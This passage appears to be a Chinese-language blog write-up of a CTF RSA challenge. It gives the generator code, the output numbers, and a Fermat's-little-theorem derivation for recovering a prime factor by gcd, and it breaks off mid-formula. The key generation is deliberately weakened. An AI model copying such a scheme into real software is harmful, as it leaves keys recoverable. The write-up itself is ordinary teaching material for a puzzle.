getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">n1 = p1 * q</span><br><span class="line">h0 = <span class="built_in">pow</span>(<span class="number">1012</span> * q + <span class="number">2024</span>, p1, n1)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;h0 = <span class="subst">&#123;h0&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n1 = <span class="subst">&#123;n1&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n2 = p * q1</span><br><span class="line">h1 = getPrime(<span class="number">128</span>)*p+getPrime(<span class="number">13</span>)*q1</span><br><span class="line">h2 = getPrime(<span class="number">128</span>)*p+getPrime(<span class="number">13</span>)*q1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;h1 = <span class="subst">&#123;h1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;h2 = <span class="subst">&#123;h2&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n2 = <span class="subst">&#123;n2&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">h0 = 3220497006402049508998763812708472832647814868290156746347730942871191356255789659370553564805270033069126673720344310199953651087754072020225702916105541813428786992668144172000495857408180695235017329451164552864440669887978780387408892281885728829108705426036377534262123812335152528611168777211280571694805002313718755871797426493929314877273385162106226582910473718696585558235361302211164190022765345477880209355073870857330694309139033191510002831755011163554405501084092882774630793037506647051531578470767441695642108269033577519614546722167605348209455599860877630930453549375215766657975702946679735793440</span></span><br><span class="line"><span class="string">n1 = 20609629372145649869124883931477035418773265506807982287973634398860995335157854064383658546598627777214414513344620919765235474447787454254677033199140440513722365295528339478763686234572386246701669139829187532179573583918405628738545887852577214800663095592976049188005405242091639210252676232732956312108538849591909382864675439965387851084691144379692503823575367370407191667133473482821484955537306602611587604747693171586870973700406072872451067709522642066831289686968535823774273770385924779368338446367102184983154486987531633971065357864924738084803301054789863293592286600424063888458243900130876991944561</span></span><br><span class="line"><span class="string">h1 = 49194502383195208917988199785355579000471120627698824524136563939112767971337049691779758664899497703009458337602635607307068610164325874221815125058246159504553260658300727486252329656228567456351563661171511248498573151135374757953887871426130912974127123668357951196795364055703535399924661649957282476915345782505912688106575686848420343362888</span></span><br><span class="line"><span class="string">h2 = 56029812337811022982598747354987989915364610368395101948222609237230875599013444593473706280586983516630982411154519894488542135837471701015074142753084529513202513061481615522865380857058628008542724882609524855349464549317203533208567803034618377155637303135785566874122555481931560957334493233423618193735362609235034574175221191665401074291634</span></span><br><span class="line"><span class="string">n2 = 21127172569887870569621986802814771398069606826661397979515556618791602174698226712111670185315617811180192688381471253591193212149192104216153890060029438171543010427356810059660168369171504065120474047401466632600230981702536898738744701541132759858595341068713321976579864810553447534204513491008705215041861247277449063318972113826820821732327255577559447446606667162763843696891825420560307688553022453470653875157114663943723258181186659915926780802902213978395961981750159147594076399769386787561910947372748908551775527715538708855235861297549189165238857651886658156332640360898769204102407630920314871304057</span></span><br><span class="line"><span class="string">c = 5607552428806279725164332098717496105359323731793797865776852054987286366396268835656116948807084338497364746716217052175055013330847114498067023163878490040957130515880922531725226729467904687450269817551037876044274898360914422201634758724176912018795267171627398316542607462818553194467631468793807762529509728325759331142060865432879561622747895422022839077034959965640817419843376693946391886148327389538923557583964708218796910422008150480950732394548385083016293891237783400286493750498647816940000092965104858068292374074379723230507283787259827582725133425982004517180631242028412315096023451549819804660838</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>题目给了提示，说这题考了费马小定理。下面介绍一下这题要用上的定理</li>
<li>先介绍一下同余的性质</li>
</ul>
<p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.15999999999999992em" columnalign="left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>若</mtext><mi>a</mi><mo>≡</mo><mi>b</mi><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>m</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>d</mi><mo>∣</mo><mi>m</mi><mo separator="true">,</mo><mi>d</mi><mo>&gt;</mo><mn>0</mn><mtext>，则</mtext><mi>a</mi><mo>≡</mo><mi>b</mi><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>d</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{array}{l}
若a\equiv b(mod~m),d\mid m,d&gt;0，则a\equiv b(mod ~d)
\end{array}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2000000000000002em;vertical-align:-0.35000000000000003em;"></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">若</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">b</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">m</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">0</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">则</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">b</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord mathnormal">d</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span></span></span></span></span></p>
<ul>
<li>再介绍一下费马小定理</li>
</ul>
<p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.15999999999999992em" columnalign="left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>若</mtext><mi>p</mi><mtext>是质数，而整数</mtext><mi>a</mi><mtext>不是</mtext><mi>p</mi><mtext>的倍数，则有</mtext><msup><mi>a</mi><mrow><mi>p</mi><mo>−</mo><mn>1</mn></mrow></msup><mo>≡</mo><mn>1</mn><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{array}{l}
若p是质数，而整数a不是p的倍数，则有a^{p-1}\equiv1(mod~p)
\end{array}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2000000000000002em;vertical-align:-0.35000000000000003em;"></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">若</span><span class="mord mathnormal">p</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">质</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">而</span><span class="mord cjk_fallback">整</span><span class="mord cjk_fallback">数</span><span class="mord mathnormal">a</span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">是</span><span class="mord mathnormal">p</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">倍</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">则</span><span class="mord cjk_fallback">有</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">1</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span></span></span></span></span></p>
<ul>
<li>推导过程如下：</li>
</ul>
<p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.15999999999999992em" columnalign="left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>h</mi><mn>0</mn></msub><mo>≡</mo><mo stretchy="false">(</mo><mn>1012</mn><mo>∗</mo><mi>q</mi><mo>+</mo><mn>2024</mn><msup><mo stretchy="false">)</mo><msub><mi>p</mi><mn>1</mn></msub></msup><mtext> </mtext><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><msub><mi>n</mi><mn>1</mn></msub><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>由同余的性质得</mtext><msub><mi>h</mi><mn>0</mn></msub><mo>≡</mo><mtext> </mtext><mo stretchy="false">(</mo><mn>1012</mn><mo>∗</mo><mi>q</mi><mo>+</mo><mn>2024</mn><msup><mo stretchy="false">)</mo><msub><mi>p</mi><mn>1</mn></msub></msup><mtext> </mtext><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>q</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>这里通过二项展开等方法可以得到</mtext><mn>202</mn><msup><mn>4</mn><msub><mi>p</mi><mn>1</mn></msub></msup><mo>≡</mo><mo stretchy="false">(</mo><mn>1012</mn><mo>∗</mo><mi>q</mi><mo>+</mo><mn>2024</mn><msup><mo stretchy="false">)</mo><msub><mi>p</mi><mn>1</mn></msub></msup><mtext> </mtext><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>q</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>所以</mtext><msub><mi>h</mi><mn>0</mn></msub><mo>≡</mo><mn>202</mn><msup><mn>4</mn><msub><mi>p</mi><mn>1</mn></msub></msup><mtext> </mtext><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>q</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>而</mtext><mn>202</mn><msup><mn>4</mn><msub><mi>n</mi><mn>1</mn></msub></msup><mo>≡</mo><mtext> </mtext><mn>202</mn><msup><mn>4</mn><mrow><msub><mi>p</mi><mn>1</mn></msub><mo>∗</mo><mi>q</mi></mrow></msup><mtext> </mtext><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><msub><mi>n</mi><mn>1</mn></msub><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>从而</mtext><mn>202</mn><msup><mn>4</mn><msub><mi>n</mi><mn>1</mn></msub></msup><mo>≡</mo><mtext> </mtext><mn>202</mn><msup><mn>4</mn><mrow><msub><mi>p</mi><mn>1</mn></msub><mo>∗</mo><mi>q</mi></mrow></msup><mtext> </mtext><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>q</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>得到</mtext><mn>202</mn><msup><mn>4</mn><mrow><msub><mi>p</mi><mn>1</mn></msub><mo>∗</mo><mi>q</mi></mrow></msup><mo>≡</mo><mn>202</mn><msup><mn>4</mn><msub><mi>p</mi><mn>1</mn></msub></msup><mo>∗</mo><mn>202</mn><msup><mn>4</mn><mrow><msub><mi>p</mi><mn>1</mn></msub><mo>∗</mo><mi>q</mi><mo>−</mo><msub><mi>p</mi><mn>1</mn></msub></mrow></msup><mo>≡</mo><mn>202</mn><msup><mn>4</mn><msub><mi>p</mi><mn>1</mn></msub></msup><mo>∗</mo><mn>202</mn><msup><mn>4</mn><mrow><msub><mi>p</mi><mn>1</mn></msub><mo>∗</mo><mo stretchy="false">(</mo><mi>q</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></msup><mtext> </mtext><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>q</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>由费马小定理得到</mtext><mn>202</mn><msup><mn>4</mn><msub><mi>n</mi><mn>1</mn></msub></msup><mo>≡</mo><mn>202</mn><msup><mn>4</mn><msub><mi>p</mi><mn>1</mn></msub></msup><mo stretchy="false">(</mo><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>q</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>所以</mtext><msub><mi>h</mi><mn>0</mn></msub><mo>−</mo><mn>202</mn><msup><mn>4</mn><msub><mi>n</mi><mn>1</mn></msub></msup><mo>≡</mo><mn>0</mn><mo stretchy="false">(</mo><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>q</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>所以</mtext><msub><mi>h</mi><mn>0</mn></msub><mo>−</mo><mn>202</mn><msup><mn>4</mn><msub><mi>n</mi><mn>1</mn></msub></msup><mo>=</mo><mi>k</mi><mi>q</mi><mtext>  </mtext><mo stretchy="false">(</mo><mtext>即</mtext><mi>q</mi><mtext>的整数倍，这样就可以使用</mtext><mi>g</mi><mi>c</mi><mi>d</mi><mtext>求</mtext><msub><mi>h</mi><mn>0</mn></msub><mo>−</mo><mn>202</mn><msup><mn>4</mn><msub><mi>n</mi><mn>1</mn></msub></msup><mtext>与</mtext><msub><mi>n</mi><mn>1</mn></msub><mtext>的公倍数从而得到</mtext><mi>q</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>这里还要注意一点就是我在使用</mtext><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><mi>h</mi><mn>0</mn><mo>−</mo><mn>202</mn><msup><mn>4</mn><msub><mi>n</mi><mn>1</mn></msub></msup><mo separator="true">,</mo><msub><mi>n</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mtext>的时候，先将</mtext><mn>202</mn><msup><mn>4</mn><msub><mi>n</mi><mn>1</mn></msub></msup><mtext>次方模了个</mtext><msub><mi>n</mi><mn>1</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>这里是由于直接去算</mtext><mn>202</mn><msup><mn>4</mn><msub><mi>n</mi><mn>1</mn></msub></msup><mtext>次方是算不出来的，要算很久</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>由于</mtext><mi>g</mi><mi>c</mi><mi>d</mi><mtext>的本质是使用辗转相除法去求余数所以这里利用如下等式</mtext><mo stretchy="false">(</mo><mtext>如果不熟悉辗转相除法可以去熟悉一下</mtext><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo stretchy="false">(</mo><msub><mi>h</mi><mn>0</mn></msub><mo>−</mo><mn>202</mn><msup><mn>4</mn><msub><mi>n</mi><mn>1</mn></msub></msup><mo stretchy="false">)</mo><mi mathvariant="normal">%</mi><msub><mi>n</mi><mn>1</mn></msub><mo>=</mo><msub><mi>h</mi><mn>0</mn></msub><mi mathvariant="normal">%</mi><msub><mi>n</mi><mn>1</mn></msub><mo>−</mo><mn>202</mn><msup><mn>4</mn><msub><mi>n</mi><mn>1</mn></msub></msup><mi mathvariant="normal">%</mi><msub><mi>n</mi><mn>1</mn></msub><mo separator="true">,</mo><mtext>所以先模进行模运算减少计算量</mtext></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{array}{l}
h_0 \equiv (1012*q+2024)^{p_1}~(mod~n_1)
\\由同余的性质得h_0 \equiv~(1012*q+2024)^{p_1}~(mod~q)
\\这里通过二项展开等方法可以得到2024^{p_1}\equiv(1012*q+2024)^{p_1}~(mod~q)
\\所以h_0\equiv2024^{p_1}~(mod~q)
\\而2024^{n_1}\equiv~2024^{p_1*q}~(mod~n_1)
\\从而2024^{n_1}\equiv~2024^{p_1*q}~(mod~q)
\\得到2024^{p_1*q}\equiv2024^{p_1}*2024^{p_1*q-p_1}\equiv2024^{p_1}*2024^{p_1*(q-1)}~(mod~q)
\\由费马小定理得到2024^{n_1}\equiv 2024^{p_1}(~mod~q)
\\所以h_0-2024^{n_1}\equiv0(~mod~q)
\\所以h_0-2024^{n_1}=kq~~(即q的整数倍，这样就可以使用gcd求h_0-2024^{n_1}与n_1的公倍数从而得到q)
\\这里还要注意一点就是我在使用gcd(h0-2024^{n_1},n_1)的时候，先将2024^{n_1}次方模了个n_1
\\这里是由于直接去算2024^{n_1}次方是算不出来的，要算很久
\\由于gcd的本质是使用辗转相除法去求余数所以这里利用如下等式(如果不熟悉辗转相除法可以去熟悉一下)
\\(h_0-2024^{n_1})\%n_1=h_0\%n_1-2024^{n_1}\%n_1,所以先模进行模运算减少计算量
\end{array}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:16.848em;vertical-align:-8.174em;"></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:8.673999999999998em;"><span style="top:-10.833999999999996em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord">4</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span><span style="top:-9.633999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">由</span><span class="mord cjk_fallback">同</span><span class="mord cjk_fallback">余</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">性</span><span class="mord cjk_fallback">质</span><span class="mord cjk_fallback">得</span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace nobreak"> </span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord">4</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mclose">)</span></span></span><span style="top:-8.433999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">里</span><span class="mord cjk_fallback">通</span><span class="mord cjk_fallback">过</span><span class="mord cjk_fallback">二</span><span class="mord cjk_fallback">项</span><span class="mord cjk_fallback">展</span><span class="mord cjk_fallback">开</span><span class="mord cjk_fallback">等</span><span class="mord cjk_fallback">方</span><span class="mord cjk_fallback">法</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">到</span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord"><span class="mord">4</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord">4</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mclose">)</span></span></span><span style="top:-7.233999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">所</span><span class="mord cjk_fallback">以</span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord"><span class="mord">4</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span 